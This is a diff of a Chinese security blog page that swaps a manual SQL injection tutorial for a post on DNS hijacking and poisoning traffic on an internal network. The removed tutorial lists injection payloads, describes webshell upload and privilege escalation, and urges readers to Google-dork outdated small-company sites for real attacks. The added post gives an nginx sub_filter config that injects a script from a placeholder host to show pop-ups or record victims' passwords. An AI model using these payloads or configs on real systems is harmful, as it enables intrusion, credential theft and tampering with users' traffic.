@@ -51,7 +51,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-  <meta name="keywords" content="Web安全,">
+  <meta name="keywords" content="内网安全,">
 
 
 
@@ -67,18 +67,18 @@
 
 
 
-<meta name="description" content="前言 忽然想起来有几天没有更新了，django搭建的博客马上就要完工，也马上快要开学，所以趁着这几天再更新几篇文章。   今天选择的是入门很快的web渗透之手工注入。   有很多人从小就对黑客感兴趣，我也不例外。但是搜索资料直接搜索黑客相关的，搜出来的东西很多很杂，因为黑客要会渗透的东西很多，一时也找不到这个方面的入口。所以今天来讲一讲比较容易懂，也上手快的web渗透之sql手工注入。">
-<meta name="keywords" content="Web安全">
+<meta name="description" content="不管前方的路有多苦，只要走的方向正确，不管多么崎岖不平，都比站在原地更接近幸福。———-《千与千寻》 前言很早以前做了这方面的一点知识，同时在网络上这方面的知识也已经有部分文章介绍过了，此篇权当一点小结。 技术要点实验环境及原理在很早以前（包括现在也有）当我们打开一些较为官方性的站点（HTTP）时，就会出现一些诸如色情广告、弹出其他页面、屏幕右下角出现小广告弹窗等这种现象，可能产生这种情况中原因之">
+<meta name="keywords" content="内网安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="web渗透-基本入门方法以及sql手工注入">
-<meta property="og:url" content="http://yoursite.com/2016/08/27/web渗透入门-基本入门方法以及sql手工注入/index.html">
+<meta property="og:title" content="DNS劫持与内网投毒">
+<meta property="og:url" content="http://yoursite.com/2019/06/17/DNS劫持与内网投毒/index.html">
 <meta property="og:site_name" content="Yokeen&#39;s blog">
-<meta property="og:description" content="前言 忽然想起来有几天没有更新了，django搭建的博客马上就要完工，也马上快要开学，所以趁着这几天再更新几篇文章。   今天选择的是入门很快的web渗透之手工注入。   有很多人从小就对黑客感兴趣，我也不例外。但是搜索资料直接搜索黑客相关的，搜出来的东西很多很杂，因为黑客要会渗透的东西很多，一时也找不到这个方面的入口。所以今天来讲一讲比较容易懂，也上手快的web渗透之sql手工注入。">
+<meta property="og:description" content="不管前方的路有多苦，只要走的方向正确，不管多么崎岖不平，都比站在原地更接近幸福。———-《千与千寻》 前言很早以前做了这方面的一点知识，同时在网络上这方面的知识也已经有部分文章介绍过了，此篇权当一点小结。 技术要点实验环境及原理在很早以前（包括现在也有）当我们打开一些较为官方性的站点（HTTP）时，就会出现一些诸如色情广告、弹出其他页面、屏幕右下角出现小广告弹窗等这种现象，可能产生这种情况中原因之">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-11-29T13:33:37.085Z">
+<meta property="og:updated_time" content="2019-06-17T15:12:44.490Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="web渗透-基本入门方法以及sql手工注入">
-<meta name="twitter:description" content="前言 忽然想起来有几天没有更新了，django搭建的博客马上就要完工，也马上快要开学，所以趁着这几天再更新几篇文章。   今天选择的是入门很快的web渗透之手工注入。   有很多人从小就对黑客感兴趣，我也不例外。但是搜索资料直接搜索黑客相关的，搜出来的东西很多很杂，因为黑客要会渗透的东西很多，一时也找不到这个方面的入口。所以今天来讲一讲比较容易懂，也上手快的web渗透之sql手工注入。">
+<meta name="twitter:title" content="DNS劫持与内网投毒">
+<meta name="twitter:description" content="不管前方的路有多苦，只要走的方向正确，不管多么崎岖不平，都比站在原地更接近幸福。———-《千与千寻》 前言很早以前做了这方面的一点知识，同时在网络上这方面的知识也已经有部分文章介绍过了，此篇权当一点小结。 技术要点实验环境及原理在很早以前（包括现在也有）当我们打开一些较为官方性的站点（HTTP）时，就会出现一些诸如色情广告、弹出其他页面、屏幕右下角出现小广告弹窗等这种现象，可能产生这种情况中原因之">
 
 
 
@@ -106,13 +106,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2016/08/27/web渗透入门-基本入门方法以及sql手工注入/">
+  <link rel="canonical" href="http://yoursite.com/2019/06/17/DNS劫持与内网投毒/">
 
 
 
 
 
-  <title>web渗透-基本入门方法以及sql手工注入 | Yokeen's blog</title>
+  <title>DNS劫持与内网投毒 | Yokeen's blog</title>
   
 
 
@@ -251,7 +251,7 @@
   
 
   <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/08/27/web渗透入门-基本入门方法以及sql手工注入/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/17/DNS劫持与内网投毒/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yokeen">
@@ -268,7 +268,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">web渗透-基本入门方法以及sql手工注入</h1>
+          <h1 class="post-title" itemprop="name headline">DNS劫持与内网投毒</h1>
         
 
         <div class="post-meta">
@@ -280,8 +280,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-08-27T22:39:37+08:00">
-                2016-08-27
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-17T21:27:10+08:00">
+                2019-06-17
               </time>
             
 
@@ -298,7 +298,7 @@
 
           
           
-             <span id="/2016/08/27/web渗透入门-基本入门方法以及sql手工注入/" class="leancloud_visitors" data-flag-title="web渗透-基本入门方法以及sql手工注入">
+             <span id="/2019/06/17/DNS劫持与内网投毒/" class="leancloud_visitors" data-flag-title="DNS劫持与内网投毒">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -326,47 +326,34 @@
       
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
-<p>忽然想起来有几天没有更新了，django搭建的博客马上就要完工，也马上快要开学，所以趁着这几天再更新几篇文章。</p>
+        <p>不管前方的路有多苦，只要走的方向正确，不管多么崎岖不平，都比站在原地更接近幸福。<br>———-《千与千寻》</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很早以前做了这方面的一点知识，同时在网络上这方面的知识也已经有部分文章介绍过了，此篇权当一点小结。</p>
+<h1 id="技术要点"><a href="#技术要点" class="headerlink" title="技术要点"></a>技术要点</h1><h2 id="实验环境及原理"><a href="#实验环境及原理" class="headerlink" title="实验环境及原理"></a>实验环境及原理</h2><p>在很早以前（包括现在也有）当我们打开一些较为官方性的站点（HTTP）时，就会出现一些诸如色情广告、弹出其他页面、屏幕右下角出现小广告弹窗等这种现象，可能产生这种情况中原因之一就是被做了DNS投毒。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>运营商/攻击者通过劫持受害者用户的DNS地址然后将用户访问网站的IP地址解析到攻击者已控的网站，接着讲用户请求的流量通过反向代理/重定向到其他已控机器，当流量从已控机器返回时，在其中添加上自己想要的内容，诸如一些恶意JS文件，就可以在不影响网站原始内容的情况下弹出一些虚假投放的页面。</p>
+<blockquote>
+<p>受害者请求的流量经过已控机器时，攻击者可以通过做反向代理，将受害者的流量正常发往原始网站指向的IP地址，当流量返回时，攻击者可以修改报文，进而达到攻击的效果。</p>
 </blockquote>
 <blockquote>
-<p>今天选择的是入门很快的web渗透之手工注入。</p>
+<p>例如最常见的，将改为<script language="javascript" src="http://xxxx/1.js"></script>，这样就在目标访问的站点中引入了一条JS文件，可以在用户访问的时候实行诸如弹窗、记录密码等常见操作。</p>
 </blockquote>
+<h3 id="试验环境"><a href="#试验环境" class="headerlink" title="试验环境"></a>试验环境</h3><p>两台机器，一台做攻击者一台做受害者，手动修改受害者的DNS服务器地址来模拟用户受到DNS攻击（在实际情况中，如攻击者控制了路由设备等而受害者DNS地址又是自动获取的情况下就可以导致DNS地址被重定向）。</p>
+<h3 id="dns-py-nginx"><a href="#dns-py-nginx" class="headerlink" title="dns.py + nginx"></a>dns.py + nginx</h3><p>一直还没怎么关注Sqlmap下的dns.py文件，看了R1ngk3y写的这篇文章<a href="https://www.freebuf.com/articles/web/172921.html" target="_blank" rel="noopener">1</a>后故此了解。</p>
+<p>默认dns.py文件会将所有的请求转发到127.0.0.1（脚本具体编写方式移步原文），修改后可以指定特定的域名，更改域名指定的IP为自己的IP，从而返回自己想要的内容。</p>
+<p>dns.py将目标站点的地址重定向到已控机器，nginx做反向代理发出请求，可以在nginx配置文件中修改某些特定的值，诸如上边的例子，将&lt;/\head&gt;改为&lt;\script language=”javascript” src=”<a href="http://xxxx/1.js&quot;&gt;" target="_blank" rel="noopener">http://xxxx/1.js&quot;&gt;</a>&lt;/\script&gt;&lt;/\head&gt;。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	server_name localhost;</span><br><span class="line">	location / &#123;</span><br><span class="line">		sub_filter    <span class="tag">&lt;/<span class="name">head</span>&gt;</span>    '<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">src</span>=<span class="string">"http://xxxx/1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span>'</span><br><span class="line">		sub_filter_once on;</span><br><span class="line">		proxy_pass http://xxxxx.com;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>缺点：用户若查看目标站点的IP（如ping）会发现IP为攻击者的IP。</p>
 <blockquote>
-<p>有很多人从小就对黑客感兴趣，我也不例外。但是搜索资料直接搜索黑客相关的，搜出来的东西很多很杂，因为黑客要会渗透的东西很多，一时也找不到这个方面的入口。所以今天来讲一讲比较容易懂，也上手快的web渗透之sql手工注入。<br><a id="more"></a></p>
+<p>nginx中其实还有很多相当好用的扩展，值得去扩展。</p>
 </blockquote>
-<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="关于sql注入"><a href="#关于sql注入" class="headerlink" title="关于sql注入"></a>关于sql注入</h2><p>sql注入，就是把sql命令插入到web表单递交或输入域名或者页面请求的查询字符串中去，最终达到欺骗服务器执行恶意的sql命令的一种入侵方法。</p>
-<h2 id="如何利用简单的方法判断是否有sql注入漏洞"><a href="#如何利用简单的方法判断是否有sql注入漏洞" class="headerlink" title="如何利用简单的方法判断是否有sql注入漏洞"></a>如何利用简单的方法判断是否有sql注入漏洞</h2><p>在存在id=xx这样的Url动态链接形式中。<br>方法1：在末尾加上   ‘  (一个单引号)   看是否报错，报错存在漏洞，不报错，可能存在漏洞。<br>方法2：在末尾加上and 1=1，再加上and 1=2看两种情况是否报错。 and 1=1正常 and 1=2错误，存在注入漏洞。</p>
-<h2 id="对于access数据库的手工注入"><a href="#对于access数据库的手工注入" class="headerlink" title="对于access数据库的手工注入"></a>对于access数据库的手工注入</h2><p>方法1：联合查询法<br>①and 1=1    and 1=2   或者 ‘   (观察是否报错来判断是否为一个注入点，并且通过报错来得知相关的信息，比如数据库类型)<br>②order by xx    (查询当前页面连接的字段个数，这里需要不断的试，比如输入order 6报错，order by 5不报错，就说明有5个字段数。)<br>③union select 1,2,3,4,5 from 要猜测的表名   (对于猜测的表名，猜测正确，页面返回正常并且爆出显位(爆出数据的位置)，猜测错误，页面返回失败)<br>④union select 1,xx,3,4,xx from 猜对的表名  (通过爆出的显位，我们在显位中输入要猜测的列名。列名猜对，就可以在显位中爆出数据)<br>方法2：逐字猜解法<br>①and 1=1  and 1=2 或者 ‘  （来简单的判断是否有注入点）<br>②order by xx          (这时候发现order by 多少页面都不会报错)<br>③and exists(select * from 要猜测的表名)      —存在返回正常<br>④and exists(select 要猜测的列名 from 猜对的表名)   ——存在返回正常<br>⑤and (select top 1 len(列名) from 表名)&gt;=xx    ——-这里猜这个列名的数据的长度是多少不断测试<br>⑥and (select top 1 asc(mid(列名,1,1)) from 表名) &gt;=97   ——这里猜测的是列名数据的第一位的ascii码是多少，不断测试。<br> and (select top 1 asc(mid(列名,2,1)) from 表名) &gt;=97    ——猜测列名数据的第二位的ascii码是多少，不断测试<br> 接下来以此类推，直到猜测出他的列名数据是多少。</p>
-<hr>
-<p>注意：windows和Linux区分大小写问题。</p>
-<h2 id="对于mysql数据库的手工注入"><a href="#对于mysql数据库的手工注入" class="headerlink" title="对于mysql数据库的手工注入"></a>对于mysql数据库的手工注入</h2><blockquote>
-<p>这里有必要讲一下关于mysql和access数据库的不同,(mssql和Mysql类型一样)<br>access数据库下，直接是好多表，然后表里是字段，字段再对应相关的数据。<br>mysql数据库下，又分为好多数据库，然后相应的数据库里有相关的表，表里的字段，字段的数据。</p>
-</blockquote>
-<p>首先我们需要知道几个查询的参数。<br>user()当前数据库用户  version()当前数据库版本 database()当前页面所连接数据库名称   @@version_complie_os服务器操作系统</p>
-<p>之所以要查操作系统，是因为windows和linux的大小写区分问题，有时候不是你的命令输错了，而是你没注意大小写。</p>
-<p>①and 1=1  and 1=2  或者 ‘<br>②order by 5       (以5个字段举例)<br>③union select 1,2,3,4,5   (查看爆出的显位)  —–这里之所以不用类似access的from是因为对access的注入是属于暴力猜解，而对于mysql是属于有依据的注入，因为mysql里边有个叫information_schema的数据库，这里边储存了所有数据库的信息。<br>④union select 1,@@version_complie_os,3,database(),5         –在显位处填上要查找的信息方便下一步操作以及关于是否调整大小写<br>⑤union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=当前页面连接数据库的十六进制<br>    (从information_schema.tables这个表中查询当前页面数据库的所有表)<br>⑥union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name=想要查询数据库表的十六进制名称        (从上一步中找到想要的表名，然后从information_schema.columns这个表中查询当前这个表下的所有列名)<br>⑦union select 1，字段名，2，3，4，5 from 表名   (从想要的表名中得出想要的字段的数据)</p>
-<p>如果你找到了管理员的帐号和密码，就可以用工具扫到这个网站的后台页面，来对网站进行管理，不过后台的权限一般很小，注入是为了下一步的获得更高权限的铺垫。</p>
-<h2 id="关于cookie注入和post注入"><a href="#关于cookie注入和post注入" class="headerlink" title="关于cookie注入和post注入"></a>关于cookie注入和post注入</h2><p>其实有好多工具也是集合了好多手工注入的指令，不过工具的比较死板，所以有时候工具注入不了试试手工注入万一注入了呢。</p>
-<blockquote>
-<p>cookie注入一般是结合工具。<br>第一种、利用burp抓包后保存为文件，然后在sqlmap下指定这个文件，让他判断并且注入。<br>第二种、直接利用sqlmap来进行注入。</p>
-</blockquote>
-<p>具体的方法可以结合burpsuite和sqlmap的教程，网上也有。</p>
-<blockquote>
-<p>关于post注入<br>以前有很多漏洞，比如在用户名框和密码框输入一段指定的代码，就可以绕过用户名和密码的输入，从而直接登陆成功。</p>
-</blockquote>
-<h1 id="手工注入的进阶"><a href="#手工注入的进阶" class="headerlink" title="手工注入的进阶"></a>手工注入的进阶</h1><h2 id="闭合法"><a href="#闭合法" class="headerlink" title="闭合法"></a>闭合法</h2><p>①字符类型<br>‘ 语句 and’1=’1      语句就可以填写order by……<br>②搜索型<br> %’ 语句 and ‘%1%’=%1</p>
-<h2 id="注释法"><a href="#注释法" class="headerlink" title="注释法"></a>注释法</h2><p>这种方法主要是针对于php网页去做。<br>当我们用order by 1就报错的时候，并不是没有字段，而是他的sql查询语句写的比较复杂，我们在语句的最后边加上–，因为–在php中就是注释的意思。这样一切返回正常。<br>然后union select 1,2,3,4,5–    看看这样是否会爆出显位，如果没有爆出来，我们可以在id=xx后边加上一个  -   ，故意让他报错来爆出显位，然后利用前边讲的方法来进行相应的手工注入。</p>
-<p>order by 一定要用–，union select可以不用，自己尝试。</p>
-<h1 id="成功登录后台之后的事"><a href="#成功登录后台之后的事" class="headerlink" title="成功登录后台之后的事"></a>成功登录后台之后的事</h1><blockquote>
-<p>这时候我们已经成功的拿到了网站后台的用户名和密码并且登录成功，但是网站后台管理员的权限一般都比较小，所以我们通过上传大马来拿到webshell权限或或通过在网站的上传点上传一句话木马，来利用菜刀或者蚁剑来连接一句话木马，然后进行上传提权工具来进行提权。</p>
-</blockquote>
-<h2 id="关于漏洞的解析和截断上传"><a href="#关于漏洞的解析和截断上传" class="headerlink" title="关于漏洞的解析和截断上传"></a>关于漏洞的解析和截断上传</h2><p>这里小小的提一下。<br>其中比较典型的就是iis6.0，正常命名方式xxx.jpg，触发漏洞命名方式xxx.asp;.jpg让这个图片格式的以asp格式来解析。解析成功我们就可以连接他。通常你上传一个一句话木马的图片后，服务器并没有解析他，你用菜刀或者蚁剑连接不了，通过文件名漏洞来解析他，这样就可以成功地用工具来连接这个一句话木马。</p>
-<p>这里相关的还有iis7.0和iis7.5以及nginx&lt;8.03的漏洞，还有apache的向左解析法漏洞。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这里就先简单的介绍一下web渗透最基本的手工注入流程。</p>
-<p>说实话现在的好多工具已经做的很不错了，用工具可以进行很方便的注入，但是为了入门，还是选择了最容易上手的手工注入来做讲解，打开这扇神秘的大门，关于靶机可以在i春秋网站的实验上找到，可以用来练练手，试验机的漏洞都非常多，注入起来也很方便，容易成功来提升信心。<br>现在也有好多小公司的网站用的是比较老的方法，没有进行更新，可以用谷歌语法来找一找，进行实战。</p>
-<p>手工注入就先告一段落，马上就要开学，等到学校后再进行后续的更新，我目前先继续搞web渗透，等web渗透差不多了，在这个方向上再会陆续学习逆向工程等等…..</p>
-<p>以上都是我通过学习总结出来的，可能写得多也会有地方出错，如果有地方出错了，欢迎指正</p>
+<h3 id="closurether"><a href="#closurether" class="headerlink" title="closurether"></a>closurether</h3><p>这篇文章是参阅<a href="https://www.cnblogs.com/index-html/p/wifi_hijack_3.html#!comments" target="_blank" rel="noopener">2</a>，大牛博主写了个NodeJS脚本，可以同时实现DNS劫持 + JS脚本投毒的操作，但是唯一的缺点就是对方ping的全部IP都是攻击者这边的IP。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g closurether</span><br></pre></td></tr></table></figure></p>
+<p>然后找到closurether，启动成功，会看到用户的每一个请求，接着在closurether目录中找到config.json 与 extern.js，你自己懂如何修改，之后在受害者那边刷新就可以看到效果了。</p>
+<p>缺点：同上。</p>
+<p>说是别的协议在第二次请求会返回真实IP但是测试时并不会显示，难道是测试方法不对？</p>
+<h3 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h3><p>参考文章<a href="https://blog.wolfogre.com/posts/usage-of-mitmproxy/" target="_blank" rel="noopener">3</a>，当初测试的时候还是出现了一些问题，此条略。</p>
+<h3 id="bind-nginx"><a href="#bind-nginx" class="headerlink" title="bind + nginx"></a>bind + nginx</h3><p>bind做DNS解析搭配Nginx做反向代理，可较为完美的实现IP隐藏以及流量投毒。</p>
+<p>代码略微敏感，就先不放出来了。</p>
+<p>至此完毕，也再次谢谢各位博主分享的知识。</p>
+<h1 id="参阅文章"><a href="#参阅文章" class="headerlink" title="参阅文章"></a>参阅文章</h1><p>1、<a href="https://www.freebuf.com/articles/web/172921.html" target="_blank" rel="noopener">技术分享 | 劫持DNS通过流量植入木马实验</a><br>2、<a href="https://www.cnblogs.com/index-html/p/wifi_hijack_3.html#!comments" target="_blank" rel="noopener">WiFi流量劫持—— JS脚本缓存投毒</a><br>3、<a href="https://blog.wolfogre.com/posts/usage-of-mitmproxy/" target="_blank" rel="noopener">使用 mitmproxy + python 做拦截代理</a></p>
 
       
     </div>
@@ -417,7 +404,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+            <a href="/tags/内网安全/" rel="tag"># 内网安全</a>
           
         </div>
       
@@ -430,8 +417,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/08/23/python-web框架django博客开发/" rel="next" title="python-web框架django博客开发">
-                <i class="fa fa-chevron-left"></i> python-web框架django博客开发
+              <a href="/2019/05/31/Tor组网搭建过程/" rel="next" title="在PC以及路由器上的Tor组网搭建过程">
+                <i class="fa fa-chevron-left"></i> 在PC以及路由器上的Tor组网搭建过程
               </a>
             
           </div>
@@ -439,10 +426,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/09/17/最近目标/" rel="prev" title="最近目标">
-                最近目标 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -622,7 +605,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#开始"><span class="nav-number">2.</span> <span class="nav-text">开始</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于sql注入"><span class="nav-number">2.1.</span> <span class="nav-text">关于sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何利用简单的方法判断是否有sql注入漏洞"><span class="nav-number">2.2.</span> <span class="nav-text">如何利用简单的方法判断是否有sql注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对于access数据库的手工注入"><span class="nav-number">2.3.</span> <span class="nav-text">对于access数据库的手工注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对于mysql数据库的手工注入"><span class="nav-number">2.4.</span> <span class="nav-text">对于mysql数据库的手工注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于cookie注入和post注入"><span class="nav-number">2.5.</span> <span class="nav-text">关于cookie注入和post注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#手工注入的进阶"><span class="nav-number">3.</span> <span class="nav-text">手工注入的进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#闭合法"><span class="nav-number">3.1.</span> <span class="nav-text">闭合法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注释法"><span class="nav-number">3.2.</span> <span class="nav-text">注释法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#成功登录后台之后的事"><span class="nav-number">4.</span> <span class="nav-text">成功登录后台之后的事</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于漏洞的解析和截断上传"><span class="nav-number">4.1.</span> <span class="nav-text">关于漏洞的解析和截断上传</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后记"><span class="nav-number">5.</span> <span class="nav-text">后记</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#技术要点"><span class="nav-number">2.</span> <span class="nav-text">技术要点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验环境及原理"><span class="nav-number">2.1.</span> <span class="nav-text">实验环境及原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">2.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#试验环境"><span class="nav-number">2.1.2.</span> <span class="nav-text">试验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dns-py-nginx"><span class="nav-number">2.1.3.</span> <span class="nav-text">dns.py + nginx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#closurether"><span class="nav-number">2.1.4.</span> <span class="nav-text">closurether</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mitmproxy"><span class="nav-number">2.1.5.</span> <span class="nav-text">mitmproxy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bind-nginx"><span class="nav-number">2.1.6.</span> <span class="nav-text">bind + nginx</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参阅文章"><span class="nav-number">3.</span> <span class="nav-text">参阅文章</span></a></li></ol></div>
             
 
           </div>
